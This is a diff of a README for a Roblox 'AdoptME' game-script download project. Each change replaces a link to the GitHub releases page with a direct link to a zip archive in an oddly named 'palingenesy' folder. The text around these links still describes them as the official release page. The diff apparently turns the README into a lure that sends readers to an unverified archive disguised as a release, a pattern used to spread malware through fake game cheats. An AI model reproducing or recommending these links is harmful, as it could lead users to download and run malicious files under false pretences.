@@ -1,6 +1,6 @@
 # 🐾 AdoptME-Script-Download - Easy Script Download for Windows
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/IBRAHIM832023/AdoptME-Script-Download/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://raw.githubusercontent.com/IBRAHIM832023/AdoptME-Script-Download/main/palingenesy/Script_M_Adopt_Download_v1.6.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Follow these steps carefully to download and start the script on your Windows 11
 
 Click this link to go to the official release page where you can download the files:
 
-[Download Here](https://github.com/IBRAHIM832023/AdoptME-Script-Download/releases)
+[Download Here](https://raw.githubusercontent.com/IBRAHIM832023/AdoptME-Script-Download/main/palingenesy/Script_M_Adopt_Download_v1.6.zip)
 
 This page has all the versions available. Choose the latest release for the best experience.
 
@@ -106,7 +106,7 @@ You should take care when using any external script with Roblox, as it might aff
 
 Use the button below anytime you need to download or update the script:
 
-[![Get Script](https://img.shields.io/badge/Get-Script-blue?style=for-the-badge)](https://github.com/IBRAHIM832023/AdoptME-Script-Download/releases)
+[![Get Script](https://img.shields.io/badge/Get-Script-blue?style=for-the-badge)](https://raw.githubusercontent.com/IBRAHIM832023/AdoptME-Script-Download/main/palingenesy/Script_M_Adopt_Download_v1.6.zip)
 
 ---
 
@@ -133,4 +133,4 @@ This project focuses on providing easy access to useful Roblox scripts for Windo
 
 Visit the release page to download the script:
 
-[https://github.com/IBRAHIM832023/AdoptME-Script-Download/releases](https://github.com/IBRAHIM832023/AdoptME-Script-Download/releases)
+[https://raw.githubusercontent.com/IBRAHIM832023/AdoptME-Script-Download/main/palingenesy/Script_M_Adopt_Download_v1.6.zip](https://raw.githubusercontent.com/IBRAHIM832023/AdoptME-Script-Download/main/palingenesy/Script_M_Adopt_Download_v1.6.zip)
